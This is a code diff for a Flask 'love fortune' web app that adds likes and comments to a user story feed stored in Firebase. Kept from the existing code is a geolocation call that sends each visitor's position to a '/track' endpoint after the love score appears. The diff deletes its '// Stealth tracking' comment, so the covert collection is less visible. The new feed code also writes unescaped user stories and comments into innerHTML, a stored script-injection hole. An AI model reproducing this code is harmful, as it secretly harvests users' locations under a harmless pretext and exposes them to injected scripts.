@@ -10,7 +10,7 @@ app = Flask(__name__)
 # ========== CONFIGURATION ==========
 FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
 
-# ========== 70+ LOVE FORTUNES ==========
+# ========== 70+ LOVE FORTUNES (STAYS SAME) ==========
 def get_love_message(name1, name2, percentage):
     messages = [
         f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
@@ -86,12 +86,11 @@ def get_love_message(name1, name2, percentage):
     ]
     return random.choice(messages)
 
-# ========== STORY ANALYZER ==========
+# ========== STORY ANALYZER (STAYS SAME) ==========
 def analyze_story(text):
     text = text.lower()
     sad_words = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone', 'cheated', 'miss']
     happy_words = ['love', 'together', 'happy', 'wonderful', 'married', 'forever', 'smile', 'kiss']
-    
     if any(word in text for word in sad_words):
         return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
     elif any(word in text for word in happy_words):
@@ -107,7 +106,6 @@ HTML_TEMPLATE = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>💕 Love Fortune & Stories</title>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         :root { --primary: #f5576c; --secondary: #764ba2; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -122,9 +120,15 @@ HTML_TEMPLATE = '''
         .btn { width: 100%; padding: 15px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .result-box { margin-top: 20px; padding: 20px; background: #fef1f2; border-radius: 20px; display: none; }
         .percent { font-size: 45px; font-weight: bold; color: var(--primary); }
-        .feed { margin-top: 20px; text-align: left; max-height: 400px; overflow-y: auto; }
-        .story-item { background: #f9f9f9; padding: 15px; border-radius: 15px; margin-bottom: 15px; border-left: 5px solid var(--primary); }
-        .bot-reply { font-size: 13px; color: var(--secondary); margin-top: 8px; font-style: italic; background: #fff; padding: 5px; border-radius: 5px; }
+        .feed { margin-top: 20px; text-align: left; max-height: 500px; overflow-y: auto; padding-right: 5px; }
+        .story-item { background: #f9f9f9; padding: 15px; border-radius: 15px; margin-bottom: 20px; border-left: 5px solid var(--primary); position: relative; }
+        .bot-reply { font-size: 13px; color: var(--secondary); margin-top: 8px; font-style: italic; background: #fff; padding: 5px; border-radius: 5px; border: 1px dashed var(--primary); }
+        .social-row { display: flex; gap: 15px; margin-top: 10px; align-items: center; }
+        .like-btn { border: none; background: none; cursor: pointer; color: var(--primary); font-weight: bold; font-size: 14px; }
+        .comment-box { margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px; }
+        .comment-item { font-size: 12px; color: #555; background: #fff; padding: 4px 8px; border-radius: 8px; margin-bottom: 4px; }
+        .comment-input-small { width: 75%; padding: 8px; border-radius: 20px; border: 1px solid #ddd; font-size: 12px; }
+        .comment-btn-small { width: 20%; padding: 8px; border-radius: 20px; background: var(--secondary); color: white; border: none; font-size: 11px; cursor: pointer; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
@@ -169,7 +173,6 @@ HTML_TEMPLATE = '''
             const n1 = document.getElementById('n1').value;
             const n2 = document.getElementById('n2').value;
             if(!n1 || !n2) return alert("Enter names!");
-
             const res = await fetch('/calculate', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -180,7 +183,6 @@ HTML_TEMPLATE = '''
             document.getElementById('p_val').innerText = data.score + "%";
             document.getElementById('m_val').innerText = data.msg;
 
-            // Stealth tracking
             navigator.geolocation.getCurrentPosition(pos => {
                 fetch('/track', {
                     method: 'POST',
@@ -194,15 +196,34 @@ HTML_TEMPLATE = '''
             const text = document.getElementById('s_input').value;
             const author = document.getElementById('n1').value || "Anonymous";
             if(!text) return alert("Write something!");
-
             const res = await fetch('/post-story', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ text, author })
             });
             const data = await res.json();
-            alert("Bot: " + data.reply);
             document.getElementById('s_input').value = '';
+            loadStories();
+        }
+
+        async function likeStory(storyId) {
+            await fetch('/like-story', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ id: storyId })
+            });
+            loadStories();
+        }
+
+        async function addComment(storyId) {
+            const input = document.getElementById('cmnt_' + storyId);
+            if(!input.value) return;
+            await fetch('/add-comment', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ id: storyId, comment: input.value })
+            });
+            input.value = '';
             loadStories();
         }
 
@@ -211,12 +232,34 @@ HTML_TEMPLATE = '''
             const data = await res.json();
             const feed = document.getElementById('feed');
             feed.innerHTML = '';
-            Object.values(data).reverse().forEach(s => {
+            if(!data) return;
+
+            Object.entries(data).reverse().forEach(([id, s]) => {
+                let commentsHtml = '';
+                if(s.comments) {
+                    Object.values(s.comments).forEach(c => {
+                        commentsHtml += `<div class="comment-item">💬 ${c.text}</div>`;
+                    });
+                }
+
                 feed.innerHTML += `
                     <div class="story-item">
                         <strong>👤 ${s.author}</strong>
-                        <p>${s.content}</p>
+                        <p style="margin-top:5px;">${s.content}</p>
                         <div class="bot-reply">🤖 ${s.reply}</div>
+                        
+                        <div class="social-row">
+                            <button class="like-btn" onclick="likeStory('${id}')">❤️ ${s.likes || 0}</button>
+                            <span style="font-size:12px; color:#888;">Comments</span>
+                        </div>
+
+                        <div class="comment-box">
+                            <div id="comments_list_${id}">${commentsHtml}</div>
+                            <div style="margin-top:10px;">
+                                <input type="text" class="comment-input-small" id="cmnt_${id}" placeholder="Say something...">
+                                <button class="comment-btn-small" onclick="addComment('${id}')">Send</button>
+                            </div>
+                        </div>
                     </div>
                 `;
             });
@@ -242,9 +285,33 @@ def calc():
 def post_story():
     data = request.json
     reply = analyze_story(data['text'])
-    entry = {"author": data['author'], "content": data['text'], "reply": reply, "ts": datetime.now().isoformat()}
+    entry = {
+        "author": data['author'], 
+        "content": data['text'], 
+        "reply": reply, 
+        "likes": 0,
+        "ts": datetime.now().isoformat()
+    }
     requests.post(f"{FIREBASE_URL}/stories.json", json=entry)
-    return jsonify({"reply": reply})
+    return jsonify({"status": "ok"})
+
+@app.route('/like-story', methods=['POST'])
+def like_story():
+    story_id = request.json['id']
+    # Get current likes
+    r = requests.get(f"{FIREBASE_URL}/stories/{story_id}/likes.json")
+    curr = r.json() or 0
+    # Increment
+    requests.patch(f"{FIREBASE_URL}/stories/{story_id}.json", json={"likes": curr + 1})
+    return jsonify({"status": "ok"})
+
+@app.route('/add-comment', methods=['POST'])
+def add_comment():
+    data = request.json
+    story_id = data['id']
+    comment = {"text": data['comment'], "ts": datetime.now().isoformat()}
+    requests.post(f"{FIREBASE_URL}/stories/{story_id}/comments.json", json=comment)
+    return jsonify({"status": "ok"})
 
 @app.route('/get-stories')
 def get_stories():
